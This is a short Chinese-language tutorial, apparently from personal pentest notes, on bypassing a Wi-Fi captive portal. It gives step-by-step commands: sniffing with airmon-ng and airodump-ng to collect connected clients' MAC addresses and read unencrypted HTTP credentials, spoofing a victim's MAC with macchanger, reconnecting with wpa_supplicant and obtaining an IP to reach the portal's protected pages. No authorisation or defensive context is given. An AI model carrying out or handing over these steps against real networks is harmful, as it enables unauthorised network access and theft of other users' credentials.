Captive Portal Invasion
===

```
Captive Portal 是指在可以正常用網路前,，先導到一個登入網頁，
登入後才可以正常上網，通常用在需要付費上網的地方
或是飯店提供免費但需帳號登入的 Wi-Fi。不過不限於 Wi-Fi 連線
```
```
前面連接http://192.168.10.1     可正常連接
但http://192.168.10.1/login.php 會Error 404
其他需要登入的內容會被封鎖
我們可以透過偽造MAC位址去access位授權的頁面

但僅限於用HTTP傳送未加密封包
會發生在設定錯的時候
就可以透過封包監聽去抓到未加密的帳密
也就是我們常在WiFi Scan中看到的
**其他人可能可以看到您透過此網路傳送的資訊**
```
 
# Capture Packet 蒐集 MAC 
```bash
# 開啟監聽
sudo airmon-ng start wlan0

# 新建資料夾
mkdir ~/wifi/
mkdir ~/wifi/scan
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band bga --channel 6
# 大概抓個3分鐘
# 可以打開封包看看http會有未加密的帳號密碼
```
```bash
# target
wifi-guest F0:9F:C2:71:22:10
# 找有連到這基地台的人
# 我們需要將我們的MAC偽裝有連到這基地台的人 ex.B0:72:BF:44:B0:49
```
# 修改成偽造 MAC 位址連接
```bash
sudo systemctl stop network-manager
sudo ip link set wlan2 down
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
sudo ip link set wlan2 up
```
重新連接wifi-guest
```bash
# wpa_supplicant.conf

network={
    ssid="wifi-guest"
    key_mgmt=NONE
}
```
```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c wpa_supplient.conf

# wpa_supplicant : 用於連接 WPA-PSK/WPA2-PSK 加密的 Wi-Fi 網絡的工具
# -D : 指定要使用的驅動程序類型
# -i : 指定要配置的無線網絡介面
# -c : 指定配置文件的路徑
#      配置文件包含要連接的無線網絡的詳細信息
#      如 SSID、密碼、加密類型等


# 出現 CTRL-EVENT-CONNECTED 代表成功連結WIFI


# Get IP
sudo dhclient wlan2 -v
```
```
拿著別人的MAC跟基地台要IP
http://192.168.10.1/login.php 可以跳過Captive Portal Invasion
```
![](../_src/Captive%20Portal%20Invasion%20-%20Wireshark.png)